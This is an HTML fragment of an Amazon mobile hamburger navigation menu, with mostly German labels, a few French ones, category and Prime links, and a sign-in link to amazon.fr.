<div id="hmenu-container" cel_widget_id="Navigation-mobile-HamburgerMenu" style="display: block;" class="celwidget nav-sprite-v3" data-csa-c-id="ib9qf7-4boo2o-9xj8kj-28rn7u" data-cel-widget="Navigation-mobile-HamburgerMenu">
  <div id="hmenu-canvas-background" class="hmenu-transparent hmenu-dark-bkg-color">
    <div class="nav-sprite hmenu-close-icon"></div>
  </div>
  <div id="hmenu-canvas" class="hmenu-translateX-left nav-ignore-pinning">
    
    
    <div id="hmenu-content">
      

<a id="hmenu-close-menu" class="hmenu-hidden-link" href="javascript:void(0)">
  <div>Menü schließen</div>
</a>
<ul class="hmenu header-enabled" data-menu-id="1">
<li>
<div id="hmenu-header">
    <div id="hmenu-header-top">
        <a id="hmenu-header-account" data-recognized="0" href="">
            <div id="hmenu-header-account-text">Identifizieren Sie sich</div>
            <div id="hmenu-header-account-icon" class="nav-sprite"></div>
        </a>
    </div>
    <div id="hmenu-header-bottom">
      <a id="hmenu-header-title" href="">
          <div id="hmenu-header-title-line1">Durchsuche</div>
          <div id="hmenu-header-title-line2">Amazon</div>
      </a>
    </div>
</div>
</li>
<li>
<a id="hmenu-home-link" href="">
    <div id="hmenu-home-container">
        <div id="hmenu-home-left">
            <div id="hmenu-home-text">Amazon Homepage</div>
        </div>
        <div id="hmenu-home-right">
            <div id="hmenu-home-icon" class="nav-sprite"></div>
        </div>
    </div>
</a>
</li>
<li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Trends</div></li><li><a href="" class="hmenu-item">Meilleures Ventes</a></li><li><a href="" class="hmenu-item">Neuesten Nachrichten</a></li><li><a href="" class="hmenu-item">Verkaufsbarometer</a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">besten Kategorien</div></li><li><a href="" class="hmenu-item">Küche und Zuhause</a></li><li><a href="" class="hmenu-item">Informatik</a></li><li><a href="" class="hmenu-item">Bücher</a></li><li><a href="" class="hmenu-item">Hightech</a></li><li><a href="" class="hmenu-item" data-menu-id="2" data-ref-tag="navm_em_1_1_1_10"><div>Alle unsere Kategorien</div><i class="nav-sprite hmenu-arrow-next"></i></a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Programme und Dienstleistungen</div></li><li><a href="" class="hmenu-item">Flash-Verkäufe und Werbeaktionen
</a></li><li><a href="" id="nav-link-prime" class="hmenu-item">Probieren Sie Amazon Prime aus</a></li><li><a href="" id="video" class="hmenu-item">Prime Video</a></li><li><a href="" id="music" class="hmenu-item">Amazon Music
</a></li><li><a href="" class="hmenu-item" data-menu-id="3" data-ref-tag="navm_em_1_1_1_16"><div>Alle Programme anzeigen
</div><i class="nav-sprite hmenu-arrow-next"></i></a></li><li class="hmenu-separator"></li><li><div class="hmenu-item hmenu-title ">Hilfe und Einstellungen</div></li><li><a href="" class="hmenu-item">Koto</a></li><li><a href="" class="hmenu-item">Commandes</a></li><li><a href="" class="hmenu-item">Listen</a></li><li><a href="" class="hmenu-item">Kundendienst</a></li><li><a class="hmenu-item" onclick="$Nav.getNow(&#39;signInRedirect&#39;)(&#39;navm_em_hd_re_signin&#39;, &#39;https://www.amazon.fr/ap/signin?openid.assoc_handle=anywhere_v2_fr&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.mode=checkid_setup&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.fr%2Fgp%2Fyourstore%2Fhome%2F%3Fie%3DUTF8%26ref_%3Dnavm_em_hd_re_signin&amp;ref_=navm_em_hd_clc_signin_0_1_1_22&#39;, &#39;navm_em_hd_clc_signin_0_1_1_22&#39;)">Einloggen</a></li>
</ul>

    </div>
    <a id="hmenu-back-to-top" class="hmenu-hidden-link nav-side-menu-back-to-top" href="javascript:void(0)"><div>Seitenanfang</div></a>
  </div>
</div>
<!--NAVYAAN-HMENU-AJAX-END--></body></html>